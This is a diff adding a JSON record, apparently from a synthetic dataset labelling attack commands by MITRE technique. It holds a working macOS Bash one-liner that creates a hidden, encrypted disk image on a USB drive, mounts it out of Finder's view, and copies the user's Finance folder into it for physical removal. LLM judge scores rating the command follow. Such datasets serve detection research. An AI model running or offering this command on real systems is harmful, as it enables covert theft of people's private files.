@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "printf 's3cr3tP@ss\\n' | hdiutil create -encryption AES-256 -stdinpass -fs HFS+J -volname \".sys_upd\" -size 200m /Volumes/USB/.sys_upd.dmg && printf 's3cr3tP@ss\\n' | hdiutil attach -stdinpass -nobrowse -mountpoint /Volumes/.sys_upd /Volumes/USB/.sys_upd.dmg && cp -pR ~/Documents/Finance /Volumes/.sys_upd/ && hdiutil detach /Volumes/.sys_upd",
+  "explanation": "Creates and stealthily mounts an encrypted DMG on an external USB, copies sensitive files into it, then detaches to stage data for physical removal.",
+  "rationale_steps": [
+    "Generate encrypted container on removable media to conceal contents.",
+    "Mount with -nobrowse to avoid Finder visibility and casual discovery.",
+    "Copy target data locally to the USB image without any network usage.",
+    "Detach the image to finalize exfil payload for physical extraction."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-de1e9d37",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are well-formed with balanced quoting, correct use of pipes and &&, and valid hdiutil and cp flags.",
+        "semantic_score": 5,
+        "semantic_justification": "It creates and mounts an encrypted DMG on a USB with a hidden mountpoint, copies sensitive files, then detaches to stage data for physical removal, aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:25:55.932497Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for hdiutil, correct command separators (&&), and appropriate piping of the password to both create and attach operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by creating an encrypted container on a USB drive with a hidden mount point, copying sensitive financial data to it, and detaching it for physical exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:25:58.968043Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid macOS utilities and flags, includes proper quoting, and correctly chains commands with pipes and logical AND operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by creating a hidden, encrypted DMG on a USB, stealthily mounting it, copying sensitive files, and then detaching it, directly aligning with T1052 for exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:26:15.530662Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
